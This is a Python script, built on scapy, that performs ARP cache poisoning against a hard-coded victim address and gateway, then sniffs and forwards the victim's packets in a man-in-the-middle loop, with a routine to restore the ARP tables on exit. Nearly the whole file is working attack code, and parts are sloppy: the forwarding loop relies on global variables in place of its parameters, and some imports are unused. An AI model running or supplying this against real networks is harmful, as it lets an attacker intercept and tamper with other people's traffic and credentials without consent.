from scapy.all import Ether, ARP, srp, send
from scapy.layers.dns import DNS
from scapy.sendrecv import sniff, sendp
from services import WService
import argparse
import time
import os
import sys


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    print(target_mac)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def get_request_from(target_ip):
    # Sniff DNS requests from the target IP
    packets = sniff(filter = f'host {target_ip} ' , count=1)
    if packets:
        return packets[0]


def intercept_and_forward(target_ip, host_ip):
    try:
        while True:
            # Intercept and forward requests from the target to the host
            target_request = get_request_from(target_ip)

            if target_request:
                print(f"Request from {target_ip}: {target_request.summary()}")
                sendp(target_request, verbose=0)

            # Intercept and forward responses from the host to the target
            host_response = get_request_from(host_ip)
            if host_response:
                print(f"Response from {host_ip}: {host_response.summary()}")
                sendp(host_response, verbose=0)


            spoof(target, host, verbose)
            spoof(host, target, verbose)
            time.sleep(1)


    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network, please wait...")
        restore(target_ip, host_ip)
        restore(host_ip, target_ip)

if __name__ == "__main__":
    # victim ip address
    target = "10.0.0.17"
    # gateway ip address
    host = "10.0.0.138"
    # print progress to the screen
    verbose = True
    try:
        # Start ARP spoofing
        spoof(target, host, verbose)
        spoof(host, target, verbose)


        # Intercept and forward traffic
        intercept_and_forward(target, host)

    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network, please wait...")
        restore(target, host)
        restore(host, target)